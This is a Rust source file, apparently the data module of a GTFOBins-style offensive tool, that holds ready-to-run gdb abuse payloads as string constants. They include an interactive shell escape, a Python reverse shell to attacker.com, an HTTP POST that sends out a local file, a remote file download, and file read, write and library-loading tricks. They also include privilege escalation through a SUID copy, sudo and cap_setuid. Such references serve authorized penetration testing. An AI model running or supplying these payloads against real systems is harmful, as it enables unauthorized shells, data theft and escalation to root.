pub static BIN_NAME: &'static str = "gdb";
pub static SH_CODE: &'static str = r#"
    
    gdb -nx -ex '!sh' -ex quit
"#;
pub static RS_DESC: &'static str = "This requires that GDB is compiled with Python support. Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
    s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")' -ex quit
"#;
pub static FU_DESC_1: &'static str = "This requires that GDB is compiled with Python support. Send local file via 'd' parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.";
pub static FU_CODE_1: &'static str = r#"
    
    export URL=http://attacker.com/
    export LFILE=file_to_send
    gdb -nx -ex 'python import sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
    else: import urllib as u, urllib2 as r
    r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' -ex quit
"#;
pub static FU_DESC_2: &'static str = "This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.";
pub static FU_CODE_2: &'static str = r#"
    
    export LPORT=8888
    gdb -nx -ex 'python import sys; from os import environ as e
    if sys.version_info.major == 3: import http.server as s, socketserver as ss
    else: import SimpleHTTPServer as s, SocketServer as ss
    ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit
"#;
pub static FD_DESC: &'static str = "This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    gdb -nx -ex 'python import sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r
    else: import urllib as r
    r.urlretrieve(e["URL"], e["LFILE"])' -ex quit
"#;
pub static FW_DESC: &'static str = "This requires that GDB is compiled with Python support.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
"#;
pub static FR_DESC: &'static str = "This requires that GDB is compiled with Python support.";
pub static FR_CODE: &'static str = r#"
    
    gdb -nx -ex 'python print(open("file_to_read").read())' -ex quit
"#;
pub static LL_DESC: &'static str = "This requires that GDB is compiled with Python support.";
pub static LL_CODE: &'static str = r#"
    
    gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
"#;
pub static SUID_DESC: &'static str = "This requires that GDB is compiled with Python support.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which gdb) .

    ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo gdb -nx -ex '!sh' -ex quit
"#;
pub static CB_DESC: &'static str = "This requires that GDB is compiled with Python support.";
pub static CB_CODE: &'static str = r#"
    
    cp $(which gdb) .
    sudo setcap cap_setuid+ep gdb

    ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static LL: Code<'static> = Code {
    title: "LL_CODE",
    code: LL_CODE,
    tag: Tag::LL,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
